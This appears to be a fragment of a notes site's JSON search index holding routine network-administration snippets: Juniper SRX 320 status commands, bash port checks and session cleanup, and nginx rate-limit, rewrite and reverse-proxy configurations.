IPv4 政策\u003c/h5\u003e\n\u003col\u003e\n\u003cli\u003eFrom zone wan2 to zone Knowhow_Vlan\u003c/li\u003e\n\u003cli\u003eFrom any to IT-VPN\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eJuniper SRX 320\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看當前軟體版本號\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow system software\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看系統啟動時間\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow system uptime\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看硬體板卡及序號\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow chassis haredware\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看硬體板卡當前狀態\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow chassis environment\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看主控板（RE）資源使用及狀態\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow chassis routing-engine\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看當前防火牆併發會話數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow security flow session summary\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看當前防火牆具體併發會話\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow security flow session\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 清除當前 session\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eclear security flow session all\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 檢查全域 ALG 開啟情況\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow security alg status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查OID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow snmp mib walk decimal 1.3.6.1.2.1.2.2.1.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定政策\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset security policy zones from-zone to-zone\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看路由表\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow route\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看 ARP 表\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow arp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看系統日誌\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow log messages\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看所有介面運行狀態\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow interface terse\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看介面運行細節資訊\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow interface ge-x/y/z detail\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 比較修改\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow | compare rollback ?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow | compare rollback \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看系統\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow system\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看設定\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow configuration\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 動態統計介面資料包轉發資訊\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emonitor interface ge-x/y/z\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 動態報文抓取（Tcpdump，類似 ScreenOS snoop命令）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emonitor traffic interface ge-x/y/z\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Network docs"},{"categories":null,"contents":" Check port status # `(echo \u0026gt;/dev/tcp/${host}/${port})` (echo \u0026gt;/dev/tcp/192.168.57.24/80) \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34;open\u0026#34; || echo \u0026#34;closed\u0026#34; timeout 1 bash -c \u0026#39;\u0026gt;/dev/tcp/192.168.57.24/80 \u0026amp;\u0026gt;/dev/null\u0026#39; \u0026amp;\u0026amp; echo \u0026#34;open\u0026#34; || echo \u0026#34;closed\u0026#34; timeout 1 bash -c \u0026#39;\u0026gt;/dev/tcp/192.168.57.24/80\u0026#39; \u0026amp;\u0026amp; echo \u0026#34;open\u0026#34; || echo \u0026#34;closed\u0026#34; Block subnets ip route add blackhole 192.168.0.0/24 Kill sessions # ss sudo ss -K state TIME-WAIT # or conntrack sudo conntrack -D -p tcp --state TIME_WAIT connect IPs ss -tnH state established \\ | awk \u0026#39;{ peer = $5; if (peer == \u0026#34;\u0026#34;) peer = $NF # 取 Peer Address:Port（某些版本欄位可能不同） sub(/,$/, \u0026#34;\u0026#34;, peer) # 去掉可能的逗號 gsub(/[\\[\\]]/, \u0026#34;\u0026#34;, peer) # 去掉所有中括號 gsub(/::ffff:/, \u0026#34;\u0026#34;, peer) # IPv4-mapped IPv6 無論出現在開頭還中間都移除 sub(/%[^:]+/, \u0026#34;\u0026#34;, peer) # 去掉 IPv6 的 scope（如 %eth0） sub(/:[0-9]+$/, \u0026#34;\u0026#34;, peer) # 去掉最後的 :port print peer }\u0026#39; \\ | sort | uniq -c | sort -nr websocat connect MQTT websocat -v --binary --protocol=mqtt ws://57.77.71.2:8083/mqtt ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/network/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCheck port status\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# `(echo \u0026gt;/dev/tcp/${host}/${port})`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eecho \u0026gt;/dev/tcp/192.168.57.24/80\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u0026amp;\u0026gt;/dev/null \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;open\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;closed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etimeout \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e bash -c \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026gt;/dev/tcp/192.168.57.24/80 \u0026amp;\u0026gt;/dev/null\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;open\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;closed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etimeout \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e bash -c \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026gt;/dev/tcp/192.168.57.24/80\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;open\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;closed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eBlock subnets\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip route add blackhole 192.168.0.0/24\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eKill sessions\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# ss\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo ss -K state TIME-WAIT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# or conntrack\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo conntrack -D -p tcp --state TIME_WAIT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003econnect IPs\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ess -tnH state established \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e| awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  peer = $5; if (peer == \u0026#34;\u0026#34;) peer = $NF # 取 Peer Address:Port（某些版本欄位可能不同）\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  sub(/,$/, \u0026#34;\u0026#34;, peer)                   # 去掉可能的逗號\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  gsub(/[\\[\\]]/, \u0026#34;\u0026#34;, peer)              # 去掉所有中括號\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  gsub(/::ffff:/, \u0026#34;\u0026#34;, peer)             # IPv4-mapped IPv6 無論出現在開頭還中間都移除\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  sub(/%[^:]+/, \u0026#34;\u0026#34;, peer)               # 去掉 IPv6 的 scope（如 %eth0）\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  sub(/:[0-9]+$/, \u0026#34;\u0026#34;, peer)             # 去掉最後的 :port\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  print peer\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e| sort | uniq -c | sort -nr\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ewebsocat connect MQTT\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewebsocat -v --binary --protocol\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emqtt ws://57.77.71.2:8083/mqtt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Network Related Command"},{"categories":null,"contents":" map # map map $remote_addr $limit_key { 35.229.201.209 \u0026#34;\u0026#34;; default $binary_remote_addr; } # wss.conf limit_req_zone $limit_key zone=websocket:10m rate=20r/s; limit_req_status 499; server { location = / { limit_req zone=websocket nodelay; limit_req_log_level warn; } } rewrite 1 # https://localhost/img/nginx.svg can access /data/nginxconfig.io/src/static/nginx.svg location /img { rewrite \u0026#39;^/img/(.*)$\u0026#39; /static/$1; } location /static { root /data/nginxconfig.io/src; index nginx.svg; } 2 # https://localhost/photo/nginx.svg can access /data/nginxconfig.io/src/static/nginx.svg location /photo { root /data/nginxconfig.io/src; try_files $uri /$uri @pic; } location @pic { rewrite \u0026#39;^/photo/(.*)$\u0026#39; /static/$1; } 3 # remove prefix path and allow proxy_pass POST location /upload/ { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; root /data/nginx/html; # Remove path rewrite ^/upload/(.*) /$1 break; proxy_pass https://logo$uri$is_args$args; # Proxy_pass POST proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#39;upgrade\u0026#39;; proxy_cache_bypass $http_upgrade; #proxy_redirect https://logo/ /; } location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; root /data/nginx/html; index index.html index.htm; } grafana behind nginx server/ssl.conf ssl_certificate /etc/ssl/go2cloudten.com.crt; ssl_certificate_key /etc/ssl/go2cloudten.com.key; ssl_ciphers \u0026#34;EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EECDH+aRSA+SHA256:EECDH+aRSA+RC4:EECDH:EDH+aRSA:HIGH:!RC2:!RC4:!aNULL:!eNULL:!LOW:!IDEA:!DES:!TDES:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!EXPORT:!ANON\u0026#34;; ssl_prefer_server_ciphers on; ssl_protocols TLSv1.2 TLSv1.3; ssl_session_timeout 50m; server/proxy.conf proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; grafana.conf server { listen 443 ssl; server_name grafana-test.go2cloudten.com; server_name grafana.go2cloudten.com; include server/ssl.conf; include server/proxy.conf; access_log logs/grafana.log json; error_log logs/grafana.error.log warn; location / { proxy_pass http://grafana; proxy_connect_timeout 300; proxy_read_timeout 700; proxy_send_timeout 700; proxy_set_header Host $host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; } } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/nginx/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emap\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# map\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e $remote_addr $limit_key {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e35.229.201.209\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edefault\u003c/span\u003e $binary_remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# wss.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elimit_req_zone\u003c/span\u003e $limit_key \u003cspan style=\"color:#e6db74\"\u003ezone=websocket:10m\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003erate=20r/s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elimit_req_status\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e499\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elimit_req\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezone=websocket\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enodelay\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elimit_req_log_level\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003erewrite\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"1\"\u003e1\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# https://localhost/img/nginx.svg can access /data/nginxconfig.io/src/static/nginx.svg\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/img\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erewrite\u003c/span\u003e \u003cspan 